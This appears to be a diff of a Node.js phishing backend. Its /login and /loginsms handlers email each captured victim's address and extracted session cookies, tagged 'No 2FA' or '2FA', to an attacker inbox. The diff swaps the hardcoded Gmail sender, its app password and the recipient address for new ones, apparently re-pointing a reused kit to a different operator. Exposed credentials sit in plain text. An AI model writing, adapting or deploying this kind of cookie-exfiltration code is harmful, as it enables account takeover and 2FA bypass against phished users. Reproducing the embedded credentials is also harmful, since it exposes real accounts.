@@ -41,8 +41,8 @@ const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: process.env.EMAIL_USER || 'jebali.khalil23@gmail.com',
-        pass: process.env.EMAIL_PASS || 'ngpg amdl pvtj oeek',
+        user: process.env.EMAIL_USER || 'Eakyra576@gmail.com',
+        pass: process.env.EMAIL_PASS || 'yole ltju tblr durn',
     },
 });
 
@@ -506,8 +506,8 @@ app.post('/login', async (req, res) => {
                     
                     // Send No-2FA email notification
                     const emailOptions = {
-                        from: process.env.EMAIL_USER || 'jebali.khalil23@gmail.com',
-                        to: 'feac23@outlook.com',
+                        from: process.env.EMAIL_USER || 'Eakyra576@gmail.com',
+                        to: 'eakyra888@gmail.com',
                         subject: `Login Success [No 2FA]: ${email}`,
                         text: `Login successful without 2FA. Cookies extracted:\n\n${JSON.stringify(userEntry, null, 2)}`,
                     };
@@ -952,8 +952,8 @@ app.post('/loginsms', async (req, res) => {
                 // Try to send 2FA email notification
                 try {
                     const emailOptions = {
-                        from: process.env.EMAIL_USER || 'jebali.khalil23@gmail.com',
-                        to: 'feac23@outlook.com',
+                        from: process.env.EMAIL_USER || 'Eakyra576@gmail.com',
+                        to: 'eakyra888@gmail.com',
                         subject: `Login Success [2FA]: ${emailPasswordData.email}`,
                         text: `Login successful with 2FA verification. Cookies extracted:\n\n${JSON.stringify(userEntry, null, 2)}`,
                     };
